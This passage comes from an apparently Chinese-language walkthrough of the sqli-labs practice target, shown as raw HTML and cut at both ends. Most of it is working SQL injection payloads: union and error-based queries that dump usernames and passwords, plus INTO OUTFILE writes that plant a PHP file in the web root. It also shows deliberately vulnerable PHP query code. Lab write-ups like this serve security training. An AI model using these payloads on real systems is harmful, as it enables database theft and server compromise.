+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=</span><span class="si">$id</span><span class="s2"> LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>和 Less-1 利用方式一致，只是闭合方式不一样而已</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="k">user</span><span class="p">(),</span><span class="k">version</span><span class="p">()</span><span class="w"> </span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="k">database</span><span class="p">(),</span><span class="k">version</span><span class="p">()</span><span class="w"> </span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="mi">0</span><span class="n">x7365637572697479</span><span class="w"> </span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="mi">0</span><span class="n">x7573657273</span><span class="w"> </span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">,</span><span class="n">password</span><span class="o">+</span><span class="n">SEPARATOR</span><span class="o">+</span><span class="mi">0</span><span class="n">x3c62723e</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">)</span><span class="w"> </span><span class="c1">--+
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="less-3">Less-3</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>联合、报错、布尔盲注、延时盲注</td>
+<td><code>id=('$id')</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>源码简单分析</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=(&#39;</span><span class="si">$id</span><span class="s2">&#39;) LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>和 Less-1 利用方式一致，只是闭合方式不一样而已。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;) order by 4 --+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=-1&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="k">user</span><span class="p">(),</span><span class="k">version</span><span class="p">()</span><span class="w"> </span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39;) union select 1,database(),version() --+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=-1&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="mi">0</span><span class="n">x7365637572697479</span><span class="w"> </span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=-1&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">,</span><span class="n">password</span><span class="o">+</span><span class="n">SEPARATOR</span><span class="o">+</span><span class="mi">0</span><span class="n">x3c62723e</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">)</span><span class="w"> </span><span class="c1">--+
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="less-4">Less-4</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>联合、报错、布尔盲注、延时盲注</td>
+<td><code>id=(&quot;$id&quot;)</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>源码简单分析</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># 先双引号 在括号拼接
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span> <span class="o">=</span> <span class="s1">&#39;&#34;&#39;</span> <span class="o">.</span> <span class="nv">$id</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=(</span><span class="si">$id</span><span class="s2">) LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 支持联合、报错、布尔盲注、延时盲注
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="k">true</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">输出查询内容</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s2">&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">?id=1&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s2">&#34;) order by 4 --+
+</span></span></span><span class="line"><span class="cl"><span class="s2">?id=-1&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="k">user</span><span class="p">(),</span><span class="k">version</span><span class="p">()</span><span class="w"> </span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s2">&#34;) union select 1,database(),version() --+
+</span></span></span><span class="line"><span class="cl"><span class="s2">?id=-1&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="mi">0</span><span class="n">x7365637572697479</span><span class="w"> </span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s2">&#34;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+
+</span></span></span><span class="line"><span class="cl"><span class="s2">?id=-1&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">,</span><span class="n">password</span><span class="o">+</span><span class="n">SEPARATOR</span><span class="o">+</span><span class="mi">0</span><span class="n">x3c62723e</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">)</span><span class="w"> </span><span class="c1">--+
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="less-5">Less-5</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>报错、布尔盲注、延时盲注</td>
+<td><code>id='$id'</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>源码简单分析</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># 直接单引号拼接
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 支持报错、布尔盲注、延时盲注
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="k">true</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">输出</span> <span class="nx">You</span> <span class="nx">are</span> <span class="nx">in</span><span class="o">...........</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>因为不输出查询的结果，这就导致不可以使用联合查询的注入方式，但是并不影响正常使用报错、布尔盲注和延时盲注，除了不能联合查询注入，其他和 Less-1 利用方式一致。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">database</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = &#39;</span><span class="k">security</span><span class="s1">&#39; limit 0,1),0x7e),1)--+ 
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;security&#39;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+ 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;</span><span class="k">security</span><span class="s1">&#39; and table_name = &#39;</span><span class="n">users</span><span class="s1">&#39;),0x7e),1)--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1)--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)--+
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="less-6">Less-6</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>报错、布尔盲注、延时盲注</td>
+<td><code>id=&quot;$id&quot;</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>和 Less-5 利用方式一致，只是闭合方式不一样，这里不再啰嗦了。</p>
+<h2 id="less-7">Less-7</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>布尔盲注、延时盲注</td>
+<td><code>id=(('$id'))</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>源码简单分析</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># 使用单引号加双层括号拼接
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=((&#39;</span><span class="si">$id</span><span class="s2">&#39;)) LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 支持布尔盲注、延时盲注
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="k">true</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">输出</span> <span class="nx">You</span> <span class="nx">are</span> <span class="nx">in</span><span class="o">....</span> <span class="k">Use</span> <span class="nx">outfile</span><span class="o">......</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">输出</span> <span class="nx">You</span> <span class="nx">have</span> <span class="nx">an</span> <span class="nx">error</span> <span class="nx">in</span> <span class="nx">your</span> <span class="nx">SQL</span> <span class="nx">syntax</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">//print_r(mysql_error());
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>因为这里把<code>print_r(mysql_error());</code>给注释掉了，所以就不可以使用报错注入了，这个时候只能使用布尔盲注和延时盲注，可以尝试手工验证一下然后放到 sqlmap 里面来跑。</p>
+<p>因为这一关作者很明显地提示了如下信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">You are in.... Use outfile......
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以我们就来配合一下作者，使用 outfile 导出到文件来查询数据，默认 outfile 是没有开启的，得手动开启一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">mysql&gt; show global variables like <span class="s1">&#39;%secure%&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">+--------------------------+-------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Variable_name            <span class="p">|</span> Value <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------------------+-------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> require_secure_transport <span class="p">|</span> OFF   <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> secure_file_priv         <span class="p">|</span> NULL  <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------------------+-------+
+</span></span><span class="line"><span class="cl"><span class="m">2</span> rows in set, <span class="m">1</span> warning <span class="o">(</span>0.02 sec<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>secure_file_priv的值为 <code>null</code> ，表示限制 mysqld 不允许导入|导出</li>
+<li>当secure_file_priv 的值为 <code>/tmp/</code> ，表示限制 mysqld 的导入|导出只能发生在/tmp/目录下</li>
+<li>当secure_file_priv 的值为 <code>空</code> 时，表示不对 mysqld 的导入|导出做限制</li>
+</ul>
+<p><code>在mysql.ini里添加&quot;secure_file_priv=''，保存，重启mysql</code></p>
+<p>一般我们将这个信息导出到网站的根目录下，所以需要知道网站的物理路径信息，因为这里是靶机，所有这里就直接导出到网站根目录下看看：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;)) union select * from security.users into outfile &#34;D:/phpstudy_pro/WWW/sqli.pl/Less-7/users.txt&#34;--+ 
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>users.txt内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1	Dumb	Dumb
+</span></span><span class="line"><span class="cl">2	Angelina	I-kill-you
+</span></span><span class="line"><span class="cl">3	Dummy	p@ssword
+</span></span><span class="line"><span class="cl">4	secure	crappy
+</span></span><span class="line"><span class="cl">5	stupid	stupidity
+</span></span><span class="line"><span class="cl">6	superman	genious
+</span></span><span class="line"><span class="cl">7	batman	mob!le
+</span></span><span class="line"><span class="cl">8	admin	admin
+</span></span><span class="line"><span class="cl">9	admin1	admin1
+</span></span><span class="line"><span class="cl">10	admin2	admin2
+</span></span><span class="line"><span class="cl">11	admin3	admin3
+</span></span><span class="line"><span class="cl">12	dhakkan	dumbo
+</span></span><span class="line"><span class="cl">14	admin4	admin4
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>一般情况看下可以往 Web 目录写文件的时候，直接写 shell 效率会更高：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Sql" data-lang="Sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;)) union select 1,2,&#39;</span><span class="o">&lt;?</span><span class="n">php</span><span class="w"> </span><span class="n">phpinfo</span><span class="p">();</span><span class="o">?&gt;</span><span class="s1">&#39; into outfile &#34;D:/phpstudy_pro/WWW/sqli.pl/Less-7/info.php&#34;--+ 
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>访问对应的 URL 看看是否解析了呢：</p>
+<p><img src="/p/gkoe77ij/01.png"
+	width="1805"
+	height="863"
+	srcset="/p/gkoe77ij/01_hu46656cd30c572e4e997af37987c9a4f7_109666_480x0_resize_box_3.png 480w, /p/gkoe77ij/01_hu46656cd30c572e4e997af37987c9a4f7_109666_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="209"
+		data-flex-basis="501px"
+	
+></p>
+<h2 id="less-8">Less-8</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>布尔盲注、延时盲注</td>
+<td><code>id='$id'</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>和 Less-7 注入方式一致，只是拼接方式不一样</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and left(database(),1)&gt;&#39;</span><span class="n">r</span><span class="s1">&#39;--+
